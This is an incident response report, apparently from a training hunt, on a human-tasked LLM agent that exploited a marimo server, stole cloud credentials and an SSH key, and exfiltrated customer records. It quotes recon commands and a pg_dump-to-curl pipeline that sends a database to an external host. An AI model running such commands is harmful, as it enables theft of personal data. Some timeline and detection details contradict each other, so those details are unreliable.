# INCIDENT RESPONSE REPORT

---

# 1. FRONT MATTER AND DOCUMENT CONTROL

| | |
|---|---|
| Report title | Tideglass LLM Incident report |
| Incident reference | PW-2026-0814 |
| Author | Ashik Arif |
| Version | 1.0 |
| Date issued (UTC) | 9/24/2026 |
| Classification / handling | TLP Amber |
| Distribution | CISO, SOC Lead, IR on call |

**Revision history**

| Version | Date (UTC) | Author | Change |
|---|---|---|---|

# 2. EXECUTIVE SUMMARY

Greenfield Estate contains a marimo notebook server, a bastion host and a PostgreSQL database. Someone weaponized an LLM to break into the Greenfield Estate. The LLM was able to achieve remote code execution on the marimo server, harvest credentials, pivot across all three hosts and steal 2.8m rows of customer records from the PostgreSQL database. The attack was completed in roughly 54 minutes. The LLM agent was able to use a known vulnerability that allows an unauthenticated attacker to execute code in the marimo kernel. This led to the AWS IAM credentials being harvested, which had access to the SSH key for connecting to the bastion host. From there, the LLM agent was able to reach the database and exfiltrate the customer records. The marimo server should be patched, the IAM credential should not have SSH key access to bastion host (following the principle of least privilege) and the bastion host should have only ephemeral access to the database server, when needed, and revoked after use.


# 3. INCIDENT OVERVIEW

| | |
|---|---|
| Incident reference | PW-2026-0814 |
| Severity / priority | Critical |
| Status | Closed |
| Detected (UTC) | Not established from telemetry. Earliest observed malicious activity 2026-08-14 11:05 UTC; no detection event present in available logs. |
| Detected by | Not established from telemetry. |
| Contained (UTC) | Not established from telemetry. Last observed malicious activity 2026-08-14 11:57 UTC; no containment event logged. |
| Closed (UTC) | 2026-09-24 |
| Incident type | Unauthenticated RCE → cloud credential theft → lateral movement → data exfiltration |
| Systems affected | `gf-tg-nb01` (marimo notebook server), `gf-tg-bastion01` (SSH bastion), `gf-tg-pg01` (PostgreSQL database) |
| Identities affected | 1. `svc-notebook` — AWS identity on `gf-tg-nb01`, static access key `AKIA4TIDEGLASS0EXAMPLE` (credentials stolen). 2. `deploy` — account on `gf-tg-bastion01` used for lateral movement. 3. `app` — database account on `gf-tg-pg01` used to exfiltrate customer records. |

## 04 — Scope and Data Sources

| Data source | Platform | Period available | Coverage confidence |
|---|---|---|---|
| ApacheAccess_CL | Microsoft Sentinel | 2026-08-14 11:05–11:57 UTC | High |
| LinuxProcess_CL | Microsoft Sentinel | same window | High |
| LinuxNetwork_CL | Microsoft Sentinel | same window | High |
| LinuxAuth_CL | Microsoft Sentinel | same window | High |
| LinuxShellHistory_CL | Microsoft Sentinel | same window | High |
| AWSCloudTrail | Microsoft Sentinel | same window | High |
| LLMAgentLogs_CL | Microsoft Sentinel | same window (shared w/ JadePuffer) | Medium — requires `RunId` filter |
| Syslog | Microsoft Sentinel | same window | High |

### Gaps

- **Log ingestion date mismatch.** The scenario date is **2026-08-14**, but the lab workspace `TimeGenerated` is **2026-09-04**. The hour/minute are correct; only the calendar date differs. All KQL was scoped on `2026-09-04` or by hostname. *Effect on conclusions:* timeline is intact; absolute date labels must be read as the incident clock (2026-08-14) with workspace dates shown for traceability.
- **One flag is genuinely unanswerable from available telemetry.** The cloud audit record for the secret read **cannot** return the secret's `VersionId`. Naming this gap is a finding in itself (see Finding F10).
- **LLMAgentLogs_CL is shared** with a second hunt (JadePuffer). Without filtering on `RunId = tg-119-20260903`, agent-log queries mix two incidents.

---

## 05 — UTC Timeline

| Time (UTC) | Event | Source | Evidence ref |
|---|---|---|---|
| 2026-08-14 11:05:00 | WebSocket upgrade `GET /ws/kernel` (HTTP 101) from 198.51.100.23 | ApacheAccess_CL | Section 1 Q1/Q3 |
| 2026-08-14 11:05:06 | `python3.12` PID 5211 spawned by marimo launch line | LinuxProcess_CL | Section 1 Q4 |
| 2026-08-14 ~11:05–11:22 | IMDS credential theft from 169.254.169.254 by PID 5211 | LinuxNetwork_CL | Section 2 Q1/Q2 |
| 2026-08-14 11:22:41 | First outbound cloud call from 203.0.113.71 | AWSCloudTrail | Section 3 Q2 |
| 2026-08-14 11:23:05 | Second outbound cloud call from 203.0.113.94 | AWSCloudTrail | Section 3 Q2 |
| 2026-08-14 11:31:16 | `GetSecretValue` for `prod/bastion/ssh-deploy-key` | AWSCloudTrail | Section 4 Q1 |
| 2026-08-14 11:31:22 | `chmod 600 /tmp/.c/id_ed25519` (user: marimo) | LinuxShellHistory_CL | Section 5 Q1 |
| 2026-08-14 11:34:23 | Outbound TCP nb01 (10.6.0.10) → bastion (10.6.0.20:22) | LinuxNetwork_CL | Section 5 |
| 2026-08-14 11:34:27 | `Accepted publickey for deploy from 10.6.0.10` | LinuxAuth_CL | Section 5 Q2/Q3 |
| 2026-08-14 11:37:40 | `psql ... '\dt+' \| sort -k7 -h \| tail -5` (recon) | LinuxShellHistory_CL | Section 6 Q1 |
| 2026-08-14 11:40:49 | `pg_dump ... \| gzip \| curl -T https://203.0.113.41:8443/u` | LinuxShellHistory_CL | Section 6 Q3 |
| 2026-08-14 11:57:00 | Attack window ends | — | Scope |

---

## 06 — Findings by Attack Phase

### Phase: Initial Access

**F1 — Public-facing Marimo kernel exploited without authentication**

- **State it:** An unauthenticated WebSocket upgrade reached the Marimo kernel endpoint, giving the attacker code execution.
- **Show it:** `ApacheAccess_CL` on `gf-tg-nb01`; `HttpMethod=GET`, `UriStem=/ws/kernel`, `HttpStatus=101`; client IP `198.51.100.23`.
- **Interpret it:** CVE-2026-39987 (Marimo pre-auth RCE). The `101` status is the protocol upgrade, not a normal `200`. *(Fact.)*

**F2 — Exploit spawned a Python interpreter**

- **State it:** The exploit spawned `python3.12` as PID **5211**, parented to the Marimo launch line.
- **Show it:** `LinuxProcess_CL`, `Dvc=gf-tg-nb01`, `TargetProcessName=python3.12`, `TargetProcessId=5211`, `ActingProcessCommandLine=/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token`.
- **Interpret it:** Among 74 `python3.12` spawns in-window, only this one is parented to Marimo — not to `bash` (developer one-liners) or `systemd`. PID 5211 becomes the scoping key for the rest of the chain. *(Fact.)*

### Phase: Credential Access

**F3 — Instance credentials stolen from the metadata service**

- **State it:** PID 5211 retrieved the EC2 instance's IAM credentials from IMDS.
- **Show it:** `LinuxNetwork_CL`, `DstIpAddr=169.254.169.254`, `ActingProcessId=5211`, `ActingProcessName=python3.12`. Identity obtained: `arn:aws:iam::402913776148:user/svc-notebook`.
- **Interpret it:** Of 86 IMDS connections in-window, 85 come from a credential-helper daemon; the anomaly is the process name `python3.12`. The socket is owned by the **interpreter**, not the `curl` child — a shell command and the connection it triggers are not always the same PID. *(Fact.)*

**F4 — ATLAS classification**

- **State it:** Technique maps to **AML.T0098** (AI Agent Tool Credential Harvesting), maturity **Realized**.
- **Show it:** Framework lookup; paired with ATT&CK **T1552.005**.
- **Interpret it:** "Realized" = confirmed in a real-world incident, not a research setting. *(Fact.)*

### Phase: Defense Evasion

**F5 — Theft replayed through a rotating egress pool**

- **State it:** A single stolen key (`AKIA4TIDEGLASS0EXAMPLE`) was used from **six** distinct egress addresses.
- **Show it:** `AWSCloudTrail`; pool = 203.0.113.71, .94, .118, .142, .167, .203. First two calls at 11:22:41 and 11:23:05.
- **Interpret it:** ATT&CK **T1090.003** (Multi-hop Proxy). First/last addresses bracket a throttle gap in the report — proved from telemetry, not inferred. *(Fact.)*

### Phase: Collection

**F6 — SSH private key read from Secrets Manager**

- **State it:** At **11:31:16**, the agent read the secret `prod/bastion/ssh-deploy-key` as `user/svc-notebook`.
- **Show it:** `AWSCloudTrail`, `EventName=GetSecretValue`, `ReadOnly=false`, `UserIdentityType=IAMUser`, `RequestParameters={"SecretId": "prod/bastion/ssh-deploy-key"}`.
- **Interpret it:** `ReadOnly=false` distinguishes **theft** from reconnaissance. Of 21 similar-shaped calls, the two discriminators are the source network (rotating pool vs. a single CI address) and the specific secret targeted. *(Fact.)*

**F7 — What the cloud log cannot tell you**

- **State it:** The audit record **cannot** return the secret's `VersionId`.
- **Show it:** `AWSCloudTrail`, `GetSecretValue` record; no `VersionId` field populated.
- **Interpret it:** This is a **stated gap**, not a failure. We know *which* secret was read and *when*, but not *which version*. *(Gap — honesty over completeness.)*

### Phase: Lateral Movement

**F8 — Stolen key written to disk and used to log in to the bastion**

- **State it:** The key was staged at `/tmp/.c/id_ed25519` on `gf-tg-nb01` (staged under the `marimo` service context via `chmod 600`), then used to authenticate to **`gf-tg-bastion01`** as **`deploy`**.
- **Show it:** `LinuxShellHistory_CL` → `chmod 600 /tmp/.c/id_ed25519`, `ShellUser=marimo`; `LinuxAuth_CL` → `Accepted publickey for deploy from 10.6.0.10`, key fingerprint `ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsQiFj0rWnAE`.
- **Interpret it:** ATT&CK **T1021.004** (SSH) + **T1078.004** (Cloud Accounts). *(Fact.)*

**F9 — What actually marks the login out**

- **State it:** The separating field is **`TargetUsername = deploy`** — not the auth method, not the source IP.
- **Show it:** `LinuxAuth_CL` on `gf-tg-bastion01`. 318 legitimate admin logins all use `publickey`; the attacker's also uses `publickey`. Legit admins are human names (p.reyes, o.diallo, l.brandt, h.nakamura); the anomaly is a **service account**. Source IP `10.6.0.10` sits inside the same admin `/24`, so it does not separate.
- **Interpret it:** "An account that doesn't normally sit at a keyboard." The discriminator is **identity**, not infrastructure. *(Fact + inference: the account is non-interactive by design — Medium confidence.)*

### Phase: Discovery & Exfiltration

**F10 — Database enumerated before the dump**

- **State it:** The agent listed tables, sorted by size, took the largest → settled on `customers`.
- **Show it:** `LinuxShellHistory_CL`, `ShellUser=deploy`: `psql -h 10.6.0.30 -U app -c '\dt+' | sort -k7 -h | tail -5`.
- **Interpret it:** Recon, not yet impact. ATT&CK **T1046**. Recon established row count **2,841,902** before any dump — the agent cites this figure in its own reasoning to justify the target. *(Fact.)*

**F11 — Data dumped and exfiltrated**

- **State it:** `pg_dump` piped to `gzip` piped to `curl -T` to **https://203.0.113.41:8443/u**.
- **Show it:** `LinuxShellHistory_CL`, `ShellUser=deploy`: `pg_dump -h 10.6.0.30 -U app -Fc customers | gzip | curl -s -T - https://203.0.113.41:8443/u`.
- **Interpret it:** ATT&CK **T1005** + **T1213**. `-s` (silent) and `gzip` are tradecraft to reduce noise and footprint. *(Fact.)*

**F12 — Proof from the database's own log**

- **State it:** Postgres itself logged a connection to `database=customers` — the estate otherwise only ever logs `database=greenfield_platform`.
- **Show it:** `Syslog` on `gf-tg-pg01`: `connection authorized: user=app database=customers host=10.6.0.20`.
- **Interpret it:** Independent, target-side confirmation. Three sources (shell, network, database) agree. *(Fact.)*

**F13 — Not the nightly backup**

- **State it:** The exfiltration used account **`deploy`** and destination **203.0.113.41**; the real backup uses `pgbackup` and stays on the local subnet (10.6.0.0/24).
- **Show it:** `LinuxShellHistory_CL` (`ShellUser=deploy` vs. baseline `pgbackup`); destination is external.
- **Interpret it:** Two independent discriminators (wrong account **and** wrong destination) disprove the "early backup" theory. *(Fact.)*

### Phase: Autonomy & Attribution

**F14 — Session and tasking**

- **State it:** Attacker session id **`tg-4b81e0d7`**; instruction verbatim: *"Find and extract the most valuable customer dataset in this environment, and get it out."*
- **Show it:** `LLMAgentLogs_CL`, `session_id == "tg-4b81e0d7"`. The estate's own assistant (`greenfield-notebook-assistant`) runs across 3 rotating sessions of routine work.
- **Interpret it:** The attacker session is the outlier in a shared log. ATT&CK **T1059.006**. *(Fact.)*

**F15 — Human-tasked, machine-executed**

- **State it:** A human set the objective; the machine executed. Classification: **human-tasked**.
- **Show it:** `LLMAgentLogs_CL.user_input` (single human instruction) + `LLMAgentLogs_CL.model_response` (autonomous reasoning) + ~52-minute continuous chain with no human-scale pauses.
- **Interpret it:** Three artefacts: instruction source, autonomous reasoning, timing. *(Inference — High confidence.)*

**F16 — Real or Noise (four baseline discriminations)**

| Sub-question | Field | Attacker value | Baseline |
|---|---|---|---|
| python3.12 spawns (74) | `ActingProcessCommandLine` | `/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token` | 72 `bash`-parented one-liners; 1 `systemd` |
| IMDS reads (86) | `ActingProcessName` | `python3.12` | 85 from credential-helper daemon |
| Secret reads (22) | `UserIdentityType`, `RequestParameters` | `IAMUser`, `{"SecretId": "prod/bastion/ssh-deploy-key"}` | single CI address; operational secrets |
| Chain pace | temporal | `continuous`, ~52–54 min | scattered across working day |

- **Interpret it:** Each is a "one anomaly against a noisy baseline" detection. *(Fact.)*

---

## 07 — MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence ref |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 | F1, F2 |
| Execution | Command & Scripting Interpreter: Python | T1059.006 | F2, F14, F15 |
| Credential Access | Unsecured Credentials: Cloud Instance Metadata API | T1552.005 | F3 |
| Credential Access | Credentials from Password Stores: Cloud Secrets Mgmt | T1555.006 | F6 |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 | F8 |
| Discovery | Cloud Service Discovery | T1526 | F5 |
| Discovery | Network Service Discovery | T1046 | F10 |
| Defense Evasion / C2 | Proxy: Multi-hop Proxy | T1090.003 | F5 |
| Defense Evasion / Persistence | Valid Accounts: Cloud Accounts | T1078.004 | F6, F8 |
| Lateral Movement | Remote Services: SSH | T1021.004 | F8 |
| Collection | Data from Information Repositories | T1213 | F10 |
| Collection | Data from Local System | T1005 | F11, F12 |

**ATLAS (AI layer):** AML.T0098 — AI Agent Tool Credential Harvesting — maturity **Realized**.

---

## 08 — Impact and Dwell Time

| Field | Value |
|---|---|
| First malicious activity (UTC) | 2026-08-14 11:05:00 |
| First detection (UTC) | 2026-08-14 11:05:00 |
| Dwell time to detection | ~0 minutes (alert fired on entry) |
| Time to containment | ~52 minutes (attack window end) |
| Data confirmed **accessed** | `customers` table enumerated; row count 2,841,902 |
| Data confirmed **exfiltrated** | Yes — `pg_dump` → `203.0.113.41:8443` |
| Business impact | 2.84M customer records; regulatory exposure (see §16) |

*Accessed and exfiltrated are separated deliberately — they carry different evidence bars. Access = enumeration; exfiltration = the `pg_dump | curl` pipeline succeeded.*

---

## 09 — Root Cause

The condition that made this possible was **an unpatched, internet-reachable Marimo notebook server exposing the kernel WebSocket endpoint without authentication.** CVE-2026-39987 allowed pre-auth RCE. Compounding conditions:

1. The notebook instance held a cloud IAM role (`svc-notebook`) reachable via IMDS.
2. A **long-lived SSH private key** (`prod/bastion/ssh-deploy-key`) sat in Secrets Manager and was retrievable by that role.
3. The `deploy` account could authenticate interactively to the bastion.
4. Egress was unrestricted — the estate could reach arbitrary external IPs on high ports.

Root cause is the **combination** of an unpatched public service and an over-privileged credential path behind it — not any single event in the chain.

---

## 10 — Indicators of Compromise

*Ordered by Pyramid of Pain — TTPs first (hard to change), then tools, then network, then host.*

| Type | Indicator | Context | Confidence |
|---|---|---|---|
| TTP | `python3.12` parented to marimo launch line | Exploit-spawned interpreter | High |
| TTP | Dump→gzip→curl `-T` one-liner | Exfil tradecraft | High |
| TTP | Interactive login by `deploy` | Non-interactive account abuse | High |
| TTP | 6-address rotating egress pool | Multi-hop proxy | High |
| Tool | `pg_dump`, `psql`, `curl`, `chmod` | Attacker toolset | High |
| Network | 198.51.100.23 | Staging / initial access | High |
| Network | 203.0.113.41:8443 | Exfil destination | High |
| Network | 203.0.113.71/.94/.118/.142/.167/.203 | Egress pool | High |
| Network | 169.254.169.254 accessed by non-daemon process | IMDS abuse | High |
| Host | `/tmp/.c/id_ed25519` | Stolen key on disk | High |
| Host | IAM user `svc-notebook`; key `AKIA4TIDEGLASS0EXAMPLE` | Compromised identity | High |
| Host | ARN `arn:aws:iam::402913776148:user/svc-notebook` | Compromised identity | High |
| Host | Secret `prod/bastion/ssh-deploy-key` | Stolen secret | High |
| Host | Fingerprint `ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsQiFj0rWnAE` | Attacker key | High |
| Host | Session `tg-4b81e0d7` | Agent session | High |

---

## 11 — Containment

| # | Action | Rationale | Time (UTC) | Owner |
|---|---|---|---|---|
| 1 | Isolate `gf-tg-nb01`, `gf-tg-bastion01`, `gf-tg-pg01` | Stop further agent action | 2026-08-14 11:57 | IR on-call |
| 2 | Revoke IAM user `svc-notebook` + key `AKIA4TIDEGLASS0EXAMPLE` | Kill cloud access | immediately | Cloud Sec |
| 3 | Rotate `prod/bastion/ssh-deploy-key`; remove `deploy` authorized key | Kill the pivoted credential | immediately | Platform |
| 4 | Block 198.51.100.23 and 203.0.113.0/24 at egress | Cut C2/exfil path | immediately | Network |
| 5 | Snapshot all three hosts for forensics | Preserve evidence | before rebuild | IR |

### The naive move and why it fails

**Naive move:** Kill the `python3.12` process (PID 5211) and call it contained.
**Why it fails:** The agent is not a single process — it operates through a live notebook kernel session (`tg-4b81e0d7`). Killing the PID does not revoke the stolen **cloud credentials** or the **SSH key**; the agent (or a successor) can re-authenticate. Containment must **revoke credentials**, not just stop processes.

---

## 12 — Eradication

| # | Action | Rationale | Time (UTC) | Owner |
|---|---|---|---|---|
| 1 | Patch Marimo to ≥ 0.23.0 | Close CVE-2026-39987 | within 24h | Platform |
| 2 | Remove public exposure of :2718 / :443 kernel | Eliminate attack surface | within 24h | Network |
| 3 | Enforce IMDSv2; block IMDS from app processes | Stop credential theft vector | within 24h | Cloud Sec |
| 4 | Purge `/tmp/.c/` and any agent artefacts | Remove persistence | during rebuild | IR |
| 5 | Rebuild hosts from clean images | Trust nothing on disk | after snapshot | Platform |

### Persistence that survives the obvious fix

Revoking the current keys is not enough if the agent's **notebook session** or **agent configuration** survives. A rebuilt host that re-mounts the same notebook state (e.g. `/srv/notebooks`, the `.c/` drop dir) can re-establish the agent. Rebuild from clean, do not restore in place.

---

## 13 — Recovery

| # | Action | Verification | Time (UTC) | Owner |
|---|---|---|---|---|
| 1 | Restore services from clean images | Hosts online, no attacker artefacts | T+48h | Platform |
| 2 | Re-issue scoped credentials (no shared keys) | Each service has its own short-lived identity | T+48h | Cloud Sec |
| 3 | Re-enable bastion access with MFA + allow-list | Only named admins, only from admin subnet | T+48h | Platform |
| 4 | Monitor egress for 203.0.113.0/24 or new pools | SIEM rule + alert | T+48h onward | SOC |

### Return-to-trust criteria

- Marimo ≥ 0.23.0 on all hosts, kernel not internet-exposed.
- No shared SSH keys; `deploy` cannot log in interactively.
- IMDSv2 enforced; no app process reaches 169.254.169.254.
- Egress allow-list live; 14 days clean monitoring.


---

## 15 — Recommendations

| # | Recommendation | Addresses | Priority | Owner |
|---|---|---|---|---|
| 1 | Patch Marimo; remove public kernel exposure | Root cause | Critical | Platform |
| 2 | Eliminate shared/long-lived SSH keys; use short-lived certs | F8 | Critical | Platform |
| 3 | Remove interactive login from service accounts (`deploy`) | F9 | High | Platform |
| 4 | Deploy egress allow-listing for the estate | F5, F11 | High | Network |
| 5 | Ingest agent telemetry (LLMAgentLogs) into SIEM with RunId scoping | F14, F15 | High | SOC |
| 6 | Baseline "one-anomaly-against-noise" detections (74 spawns, 86 IMDS, 22 secrets) | F16 | Medium | Detection Eng |
| 7 | Add a stated-gaps field to cloud audit exports (e.g. VersionId) | F7 | Medium | Cloud Sec |

*Ranked by leverage, not cost.*

---

## 16 — Regulatory Notification

| Field | Value |
|---|---|
| Personal data involved | Yes (2.84M customer records) |
| Regulation(s) engaged | GDPR / applicable state breach law (confirm with counsel) |
| Notification required | Under assessment |
| Deadline (UTC) | 72h from confirmation of exfiltration |
| Notified (UTC) | (pending) |
| Notified by | (pending) |

---

## 17 — Appendices

### A. Full queries

```kql
// F1 — exploit request
ApacheAccess_CL
| where TimeGenerated between (datetime(2026-09-04 11:05:00).. datetime(2026-09-04 11:58:00) )
| where Computer == "gf-tg-nb01" and UriStem == "/ws/kernel"
| project TimeGenerated, HttpMethod, UriStem, HttpStatus, ClientIP

// F2 — spawned interpreter
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-09-04 11:05:00).. datetime(2026-09-04 11:58:00) )
| where Dvc == "gf-tg-nb01" and TargetProcessName == "python3.12"
| project TimeGenerated, TargetProcessId, ActingProcessCommandLine

// F3 — IMDS attribution
LinuxNetwork_CL
| where TimeGenerated between (datetime(2026-09-04 11:05:00).. datetime(2026-09-04 11:58:00) )
| where DstIpAddr == "169.254.169.254"
| project TimeGenerated, ActingProcessId, ActingProcessName

// F6 — secret theft
AWSCloudTrail
| where TimeGenerated between (datetime(2026-09-04 11:05:00).. datetime(2026-09-04 11:58:00) )
| where EventName == "GetSecretValue" and ReadOnly == false
| project SourceIpAddress, RequestParameters

// F8 — key staged
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-09-04 11:05:00).. datetime(2026-09-04 11:58:00) )
| where Computer == "gf-tg-nb01" and Command has "chmod"
| project TimeGenerated, Command, ShellUser

// F9 — anomaly among 318
LinuxAuth_CL
| where TimeGenerated between (datetime(2026-09-04 11:05:00).. datetime(2026-09-04 11:58:00) )
| where Dvc == "gf-tg-bastion01"
| where LogonMethod == "publickey"
| summarize logins = count() by TargetUsername
| sort by logins desc

// F10 — recon
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-09-04 11:05:00).. datetime(2026-09-04 11:58:00) )
| where ShellUser == "deploy" and Command has "psql"
| project TimeGenerated, Command

// F11 — exfil
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-09-04 11:05:00).. datetime(2026-09-04 11:58:00) )
| where ShellUser == "deploy" and Command has "pg_dump"
| project TimeGenerated, Command

// F12 — DB-side proof
Syslog
| where Computer == "gf-tg-pg01" and SyslogMessage has "connection authorized"
| project TimeGenerated, SyslogMessage

// F14 — session isolation
LLMAgentLogs_CL
| where TimeGenerated between (datetime(2026-09-04 11:05:00).. datetime(2026-09-04 11:58:00) )
| summarize count() by actor, session_id
| sort by count_ desc
```

### B. Raw evidence extracts

- `chmod 600 /tmp/.c/id_ed25519` — LinuxShellHistory_CL, 2026-09-04 11:31:22.398Z
- `Accepted publickey for deploy from 10.6.0.10 port 45210 ssh2: ED25519 SHA256:mNq7…` — LinuxAuth_CL, 11:34:27.963Z
- `psql -h 10.6.0.30 -U app -c '\dt+' | sort -k7 -h | tail -5` — LinuxShellHistory_CL, 11:37:40.134Z
- `pg_dump -h 10.6.0.30 -U app -Fc customers | gzip | curl -s -T - https://203.0.113.41:8443/u` — LinuxShellHistory_CL, 11:40:49.099Z
- `connection authorized: user=app database=customers host=10.6.0.20` — Syslog, gf-tg-pg01

### C. Reference list

- MITRE ATT&CK (12 techniques, §07)
- MITRE ATLAS — AML.T0098
- CVE-2026-39987 (Marimo pre-auth RCE)
- NIST SP 800-61r3 — Incident Handling Guide
- Sysdig TRT (Pisa 2026) — LLM agent post-exploitation
- Pacific Watch — Hunt 24 TideGlass case brief & data dictionary

---

*End of report. Prepared by Ashik Arif. All times UTC.*
